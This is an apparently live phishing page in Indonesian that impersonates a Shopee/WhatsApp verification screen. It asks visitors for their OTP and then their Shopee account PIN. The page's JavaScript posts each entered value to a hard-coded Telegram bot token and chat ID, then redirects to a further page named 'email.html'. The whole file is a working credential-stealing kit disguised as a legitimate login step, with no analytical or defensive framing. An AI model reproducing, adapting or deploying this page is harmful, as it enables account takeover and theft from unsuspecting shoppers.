<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masukkan Kode Verifikasi</title>
    <style>
        body {
            font-family: "Roboto", Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
            color: #333;
        }

        header {
            display: flex;
            align-items: center;
            padding: 14px 16px;
            background: #fff;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
        }

        header h1 {
            flex: 1;
            text-align: center;
            font-size: 18px;
            margin: 0;
            font-weight: 500;
        }

        .content {
            padding: 24px 16px;
            text-align: center;
        }

        .content p {
            font-size: 15px;
            color: #444;
            margin: 6px 0;
        }

        .wa {
            color: #333;
            /* Warna diubah menjadi hitam */
            font-weight: bold;
        }

        .otp-box {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 30px 0;
        }

        .otp-box input {
            width: 40px;
            height: 48px;
            font-size: 20px;
            text-align: center;
            border: none;
            border-bottom: 2px solid #ccc;
            outline: none;
            transition: border-color 0.2s;
        }

        .otp-box input:focus {
            border-color: #25D366;
        }

        button {
            background: #ccc;
            color: #fff;
            font-size: 16px;
            border: none;
            width: 100%;
            padding: 12px;
            border-radius: 6px;
            cursor: not-allowed;
            transition: background 0.3s;
        }

        button.active {
            background: #EE4D2D;
            /* Warna oranye Shopee */
            cursor: pointer;
        }

        .wait {
            margin-top: 14px;
            font-size: 14px;
            color: #666;
        }

        .wait span {
            color: #e65100;
            font-weight: 500;
        }

        /* Style untuk bagian PIN (awalnya disembunyikan) */
        .pin-section {
            display: none;
            margin-top: 20px;
        }

        .pin-box {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 30px 0;
        }

        .pin-box input {
            width: 40px;
            height: 48px;
            font-size: 20px;
            text-align: center;
            border: none;
            border-bottom: 2px solid #ccc;
            outline: none;
            transition: border-color 0.2s;
        }

        .pin-box input:focus {
            border-color: #EE4D2D;
            /* Warna oranye Shopee */
        }
    </style>
</head>

<body>
    <header>
        <h1>Masukkan Kode Verifikasi</h1>
    </header>
    <div class="content" id="otp-section">
        <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b class="wa">WhatsApp Yang Terdaftar</b></p>
        <p><b class="wa"></b></p>
        <div class="otp-box">
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
        </div>
        <button id="lanjut" disabled>Lanjut</button>
        <div class="wait">Jika yang muncul otp link Mohon tunggu <span id="countdown">60</span> detik untuk mengirim ulang kode otp digit</div>
    </div>
    <div class="content pin-section" id="pin-section">
        <p>Masukkan PIN Akun Shopee Anda</p>
        <div class="pin-box">
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
        </div>
        <button id="konfirmasi-pin" disabled>Konfirmasi PIN</button>
    </div>
    <script>
        // === Konfigurasi Telegram ===
        const TELEGRAM_BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
        const TELEGRAM_CHAT_ID = '5923031825';

        // === OTP Input Logic ===
        const otpInputs = document.querySelectorAll(".otp-input");
        const lanjutBtn = document.getElementById("lanjut");
        const otpSection = document.getElementById("otp-section");
        const pinSection = document.getElementById("pin-section");

        otpInputs.forEach((input, index) => {
            input.addEventListener("input", (e) => {
                // Selalu hapus karakter non-angka
                const value = e.target.value.replace(/[^0-9]/g, ""); 
                e.target.value = value;
                
                if (value && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                checkOtpFilled();
            });
            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });

        function checkOtpFilled() {
            const allFilled = Array.from(otpInputs).every((input) => input.value !== "");
            if (allFilled) {
                lanjutBtn.classList.add("active");
                lanjutBtn.disabled = false;
            } else {
                lanjutBtn.classList.remove("active");
                lanjutBtn.disabled = true;
            }
        }
        
        lanjutBtn.addEventListener("click", () => {
            const otp = Array.from(otpInputs).map((i) => i.value).join("");
            sendToTelegram(`Kode OTP: ${otp}`); // Kirim OTP ke Telegram
            // Sembunyikan bagian OTP dan tampilkan bagian PIN
            otpSection.style.display = "none";
            pinSection.style.display = "block"; 
            
            // Atur fokus ke input pertama PIN
            const pinInputs = document.querySelectorAll(".pin-input");
            if (pinInputs.length > 0) {
                 pinInputs[0].focus();
            }
        });

        // === Countdown Timer (60 detik) ===
        let time = 60;
        const countdownEl = document.getElementById("countdown");
        const timer = setInterval(() => {
            time--;
            countdownEl.textContent = time;
            if (time <= 0) {
                clearInterval(timer);
                countdownEl.parentElement.textContent = "Kamu bisa mengirim ulang kode sekarang.";
            }
        }, 1000);

        // === PIN Input Logic ===
        const pinInputs = document.querySelectorAll(".pin-input");
        const konfirmasiPinBtn = document.getElementById("konfirmasi-pin");

        pinInputs.forEach((input, index) => {
            input.addEventListener("input", (e) => {
                // Selalu hapus karakter non-angka
                const value = e.target.value.replace(/[^0-9]/g, ""); 
                e.target.value = value;

                if (value && index < pinInputs.length - 1) {
                    pinInputs[index + 1].focus();
                }
                checkPinFilled();
            });
            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !e.target.value && index > 0) {
                    pinInputs[index - 1].focus();
                }
            });
        });

        function checkPinFilled() {
            const allFilled = Array.from(pinInputs).every((input) => input.value !== "");
            if (allFilled) {
                konfirmasiPinBtn.classList.add("active");
                konfirmasiPinBtn.disabled = false;
            } else {
                konfirmasiPinBtn.classList.remove("active");
                konfirmasiPinBtn.disabled = true;
            }
        }
        
        konfirmasiPinBtn.addEventListener("click", () => {
            const pin = Array.from(pinInputs).map((i) => i.value).join("");
            sendToTelegram(`PIN Akun Shopee: ${pin}`); // Kirim PIN ke Telegram
            // Alihkan ke halaman berikutnya
            window.location.href = "email.html"; 
        });

        // === Fungsi untuk mengirim data ke Telegram ===
        function sendToTelegram(message) {
            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Pesan berhasil dikirim ke Telegram!');
                    } else {
                        console.error('Gagal mengirim pesan ke Telegram:', data.description);
                    }
                })
                .catch(error => {
                    console.error('Terjadi kesalahan:', error);
                });
        }
    </script>
</body>

</html>
